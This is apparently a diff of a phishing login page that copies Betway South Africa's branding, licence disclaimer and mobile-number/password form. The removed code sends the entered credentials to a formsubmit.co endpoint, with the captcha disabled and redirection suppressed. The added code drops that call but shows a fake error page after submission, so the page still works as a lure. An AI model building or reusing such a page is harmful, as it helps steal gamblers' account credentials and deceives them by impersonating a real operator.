@@ -6,98 +6,87 @@
   <title>Login Page</title>
   <link rel="stylesheet" href="sebono.css">
   <style>
-    .success-message, .error-message {
-      display: none;
-      text-align: center;
-      font-weight: bold;
-      margin-top: 10px;
+    .page {
+      display: none; /* Hide all pages by default */
     }
-
-    .success-message {
-      color: green;
+    .page.active {
+      display: block; /* Show only the active page */
     }
-
+    .container {
+      margin: 0 auto;
+      padding: 20px;
+      max-width: 400px;
+      background-color: #f9f9f9;
+      border-radius: 10px;
+      box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+    }
     .error-message {
-      color: red;
+      color: #ff0000;
+      font-size: 18px;
+      text-align: center;
+      padding: 20px;
     }
   </style>
 </head>
 <body>
+  <!-- Form Page -->
+  <div class="page active" id="form-page">
+    <div class="header">
+      <div class="logo">betway</div>
+      <div class="header-buttons">
+        <button class="login-btn">Login</button>
+        <button class="signup-btn">Sign Up</button>
+        <button class="betslip-btn">Bet Slip</button>
+      </div>
+    </div>
 
-  <div class="header">
-    <div class="logo">betway</div>
-    <div class="header-buttons">
-      <button class="login-btn">Login</button>
-      <button class="signup-btn">Sign Up</button>
-      <button class="betslip-btn">Bet Slip</button>
+    <div class="container">
+      <h2>Login</h2>
+      <form id="login-form">
+        <label for="mobile">Mobile Number</label>
+        <input type="tel" id="mobile" name="mobile" placeholder="+27 Mobile Number" required />
+
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Password" required />
+
+        <div class="text-link"><a href="#">Forgot Password?</a></div>
+
+        <button type="submit">Login</button>
+      </form>
+
+      <div class="bottom">
+        Don’t have an account yet? <a href="#">Sign Up</a>
+      </div>
+    </div>
+
+    <div class="disclaimer">
+      Raging River Trading (Pty) Ltd (2011/134505/07) is licensed to promote Betway South Africa,
+      regulated by the Western Cape Gambling and Racing Board. Bookmaker License Number:
+      10181496-010 issued on 1 December 2016. No persons under the age of 18 years are permitted
+      to gamble. Winners know when to stop. National Responsible Gambling Programme:
+      0800 006 008 or WHATSAPP HELP 076 675 0710. <strong>Warning:</strong> Gambling involves risk.
+      Gambling on this website, you run the risk that you may lose.
     </div>
   </div>
 
-  <div class="container">
-    <h2>Login</h2>
-    <form id="login-form">
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="about:blank"> <!-- Prevents redirection -->
-
-      <label for="mobile">Mobile Number</label>
-      <input type="tel" id="mobile" name="mobile" placeholder="+27 Mobile Number" required />
-
-      <label for="password">Password</label>
-      <input type="password" id="password" name="password" placeholder="Password" required />
-
-      <div class="text-link"><a href="#">Forgot Password?</a></div>
-
-      <button type="submit">Login</button>
-    </form>
-
-    <div class="success-message" id="success-message">
-      Your submission has been received!
+  <!-- Error Page -->
+  <div class="page" id="error-page">
+    <div class="container">
+      <h1 class="error-message">An error has been detected</h1>
+      <p>Please try again later.</p>
     </div>
-    <div class="error-message" id="error-message">
-      An error has been detected. Please try again later.
-    </div>
-
-    <div class="bottom">
-      Don’t have an account yet? <a href="#">Sign Up</a>
-    </div>
-  </div>
-
-  <div class="disclaimer">
-    Raging River Trading (Pty) Ltd (2011/134505/07) is licensed to promote Betway South Africa,
-    regulated by the Western Cape Gambling and Racing Board. Bookmaker License Number:
-    10181496-010 issued on 1 December 2016. No persons under the age of 18 years are permitted
-    to gamble. Winners know when to stop. National Responsible Gambling Programme:
-    0800 006 008 or WHATSAPP HELP 076 675 0710. <strong>Warning:</strong> Gambling involves risk.
-    Gambling on this website, you run the risk that you may lose.
   </div>
 
   <script>
-    document.getElementById('login-form').addEventListener('submit', async function (e) {
-      e.preventDefault(); // Prevent the default form submission
+    document.getElementById('login-form').addEventListener('submit', function (e) {
+      e.preventDefault(); // Prevent default form submission
 
-      const form = e.target;
-      const formData = new FormData(form);
+      // Hide the form page
+      document.getElementById('form-page').classList.remove('active');
 
-      const successMessage = document.getElementById('success-message');
-      const errorMessage = document.getElementById('error-message');
-
-      try {
-        const response = await fetch('https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21', {
-          method: 'POST',
-          body: formData
-        });
-
-        if (response.ok) {
-          successMessage.style.display = 'block'; // Show success message
-          form.reset(); // Clear form fields
-        } else {
-          throw new Error('Submission failed');
-        }
-      } catch (error) {
-        errorMessage.style.display = 'block'; // Show error message
-      }
+      // Show the error message page
+      document.getElementById('error-page').classList.add('active');
     });
   </script>
-
 </body>
 </html>
